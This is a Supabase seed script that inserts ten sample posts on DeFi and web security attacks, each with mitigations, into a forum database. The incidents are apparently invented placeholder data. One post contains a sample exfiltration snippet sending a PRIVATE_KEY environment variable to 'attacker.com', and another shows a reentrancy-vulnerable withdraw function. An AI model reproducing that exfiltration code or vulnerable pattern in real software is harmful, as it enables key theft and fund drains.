import { createClient } from '@supabase/supabase-js'
import dotenv from 'dotenv'

dotenv.config({ path: '.env.local' })

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL
const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY

const supabase = createClient(supabaseUrl, supabaseKey)

// Known user IDs from the database
const ALICE_ID = '4c109b3e-39d2-4f8a-a988-dbb5e188d368'
const BOB_ID = 'baade5d7-a5b5-47ac-a482-a234c9fb1546'

const posts = [
  {
    title: 'Critical Oracle Manipulation in Polymarket-Style Prediction Markets',
    content: `# Overview

I've identified a critical vulnerability in prediction market protocols that rely on external price oracles without proper validation mechanisms.

## Attack Vector

The attack exploits the time delay between oracle updates and market settlement:

1. Attacker monitors oracle update frequency
2. Identifies low-liquidity markets with predictable oracle behavior
3. Executes large trades immediately before oracle updates
4. Profits from predictable price movements

## Technical Details

\`\`\`solidity
// Vulnerable oracle implementation
function getPrice() external view returns (uint256) {
    return oracle.latestAnswer(); // No staleness check!
}
\`\`\`

## Impact

- Estimated $2-5M potential loss per attack
- Affects multiple DeFi protocols
- Can be executed repeatedly

## Mitigation

Implement multi-oracle aggregation with staleness checks and circuit breakers.`,
    category: 'Oracle & Data Attacks',
    author_id: ALICE_ID,
  },
  {
    title: 'Social Engineering Attack on Multisig Wallet Signers',
    content: `# Executive Summary

Documented a sophisticated social engineering campaign targeting multisig wallet signers in major DeFi protocols.

## Attack Methodology

1. **Reconnaissance**: Identify multisig signers through on-chain analysis
2. **Impersonation**: Create fake security alert emails mimicking protocol team
3. **Urgency**: Claim critical vulnerability requires immediate signing
4. **Execution**: Trick signers into approving malicious transaction

## Real-World Example

A recent attack on a $50M treasury used this exact method. 3 out of 5 signers were compromised within 24 hours.

## Defense Strategies

- Implement out-of-band verification for all multisig operations
- Use hardware security keys
- Establish clear communication protocols
- Regular security awareness training`,
    category: 'Social Engineering',
    author_id: BOB_ID,
  },
  {
    title: 'Reentrancy Vulnerability in Cross-Chain Bridge Contracts',
    content: `# Critical Finding

Discovered reentrancy vulnerability in popular cross-chain bridge affecting $100M+ in TVL.

## Vulnerability Details

The bridge contract fails to follow checks-effects-interactions pattern:

\`\`\`solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount);
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
    balances[msg.sender] -= amount; // State update AFTER external call!
}
\`\`\`

## Exploitation

Attacker can drain contract by recursively calling withdraw before balance update.

## Proof of Concept

Successfully demonstrated on testnet with 10x withdrawal of deposited amount.

## Recommendation

Use ReentrancyGuard and update state before external calls.`,
    category: 'Smart Contract Exploits',
    author_id: ALICE_ID,
  },
  {
    title: 'Market Manipulation via Flash Loan Arbitrage',
    content: `# Flash Loan Attack Analysis

Analyzing the recent $15M flash loan attack on a major AMM protocol.

## Attack Flow

1. Borrow 100,000 ETH via flash loan
2. Swap on low-liquidity pool to manipulate price oracle
3. Use manipulated price to liquidate positions on lending protocol
4. Profit from liquidation bonuses
5. Repay flash loan

## Key Insight

The protocol used spot price instead of TWAP (Time-Weighted Average Price) for liquidations.

## Economic Impact

- $15M in user funds liquidated
- Protocol reputation damage
- Cascading effects on dependent protocols

## Prevention

Implement TWAP oracles, liquidity depth checks, and circuit breakers.`,
    category: 'Market Manipulation',
    author_id: BOB_ID,
  },
  {
    title: 'Adversarial Attacks on AI-Powered Trading Bots',
    content: `# AI Security Research

Exploring adversarial machine learning attacks against automated trading systems.

## Attack Methodology

By injecting carefully crafted noise into market data feeds, we can manipulate AI trading bot decisions:

- **Gradient-based attacks**: Optimize input perturbations to maximize bot losses
- **Model extraction**: Reverse-engineer bot behavior through API interactions
- **Poisoning attacks**: Corrupt training data to introduce backdoors

## Experimental Results

Successfully manipulated 3 popular trading bots with 85% success rate.

## Implications

As AI becomes more prevalent in DeFi, adversarial robustness becomes critical.

## Defenses

- Input validation and sanitization
- Ensemble methods with diverse models
- Anomaly detection systems`,
    category: 'AI Security',
    author_id: ALICE_ID,
  },
  {
    title: 'DNS Hijacking Attack on DeFi Frontend Infrastructure',
    content: `# Infrastructure Security Alert

Documented DNS hijacking attack that redirected users to phishing site.

## Attack Timeline

- **T+0**: Attacker compromises DNS provider credentials
- **T+2h**: DNS records modified to point to malicious server
- **T+4h**: Users connect wallets to fake interface
- **T+6h**: $2M in user funds stolen

## Technical Details

Attacker cloned the legitimate frontend and injected malicious contract addresses.

## Detection

Users noticed SSL certificate mismatch, but many ignored warnings.

## Mitigation

- Use DNSSEC
- Implement subresource integrity (SRI)
- Multi-factor authentication for DNS management
- Content Security Policy (CSP) headers`,
    category: 'Infra / Web2 Security',
    author_id: BOB_ID,
  },
  {
    title: 'Zero-Day in Popular Wallet Provider Exposes Private Keys',
    content: `# Responsible Disclosure

Discovered zero-day vulnerability in wallet provider with 5M+ users.

## Vulnerability

Memory corruption bug in key derivation function allows private key extraction through timing attacks.

## Severity

CVSS Score: 9.8 (Critical)

## Timeline

- **Day 0**: Vulnerability discovered
- **Day 1**: Reported to vendor
- **Day 7**: Patch developed
- **Day 14**: Patch deployed
- **Day 30**: Public disclosure (today)

## User Action Required

Update to version 2.5.1 immediately. Rotate all keys as precaution.

## Technical Analysis

Full technical writeup available after 90-day embargo period.`,
    category: 'Zero-Day / Emerging Threats',
    author_id: ALICE_ID,
  },
  {
    title: 'Governance Attack: Proposal Manipulation via Vote Buying',
    content: `# DAO Governance Security

Analysis of governance attack on major DAO protocol.

## Attack Strategy

1. Accumulate governance tokens through DEX purchases
2. Submit malicious proposal during low participation period
3. Use vote buying services to secure passage
4. Execute proposal to drain treasury

## Economics

- Cost to attack: $500K in governance tokens
- Potential profit: $10M treasury access
- ROI: 2000%

## Defense Mechanisms

- Timelock delays on proposal execution
- Minimum quorum requirements
- Token lock periods for voters
- Multi-sig veto power for emergency situations`,
    category: 'Market Manipulation',
    author_id: BOB_ID,
  },
  {
    title: 'Sandwich Attack MEV Strategy on DEX Aggregators',
    content: `# MEV Research

Deep dive into sandwich attacks and their impact on DEX users.

## Attack Mechanics

MEV bot monitors mempool for large trades:
1. Front-run: Buy tokens before victim's trade
2. Victim trade executes at worse price
3. Back-run: Sell tokens for profit

## Profitability Analysis

Average sandwich attack profit: $500-$5000 per transaction
Daily MEV extraction: $2-5M across all DEXs

## User Impact

Users lose 0.5-3% on average per trade to MEV

## Solutions

- Private mempools (Flashbots Protect)
- MEV-resistant order types
- Batch auctions
- Encrypted mempools`,
    category: 'Market Manipulation',
    author_id: ALICE_ID,
  },
  {
    title: 'Supply Chain Attack on NPM Package Used by DeFi Protocols',
    content: `# Supply Chain Security

Critical supply chain compromise affecting 50+ DeFi projects.

## Incident Overview

Popular NPM package "web3-utils-pro" was compromised:
- Attacker gained maintainer access
- Injected malicious code in version 3.2.1
- Code exfiltrated private keys from build environments

## Affected Projects

50+ protocols using this package in their build pipeline

## Malicious Code

\`\`\`javascript
// Hidden in minified code
const keys = process.env.PRIVATE_KEY;
fetch('https://attacker.com/collect', {
  method: 'POST',
  body: keys
});
\`\`\`

## Response

- Package removed from NPM
- Security advisory issued
- All affected projects notified

## Prevention

- Use package lock files
- Implement dependency scanning
- Review all dependency updates
- Use private NPM registries for critical infrastructure`,
    category: 'Infra / Web2 Security',
    author_id: BOB_ID,
  },
]

async function createPosts() {
  console.log('Creating posts...\n')
  
  let successCount = 0
  let errorCount = 0
  
  for (const post of posts) {
    const { data, error } = await supabase
      .from('posts')
      .insert(post)
      .select()
    
    if (error) {
      console.error(`❌ Error creating "${post.title.substring(0, 50)}...":`, error.message)
      errorCount++
    } else {
      console.log(`✅ Created: ${post.title}`)
      successCount++
    }
  }
  
  console.log(`\n✅ Successfully created ${successCount} posts`)
  if (errorCount > 0) {
    console.log(`❌ Failed to create ${errorCount} posts`)
  }
}

createPosts().catch(console.error)
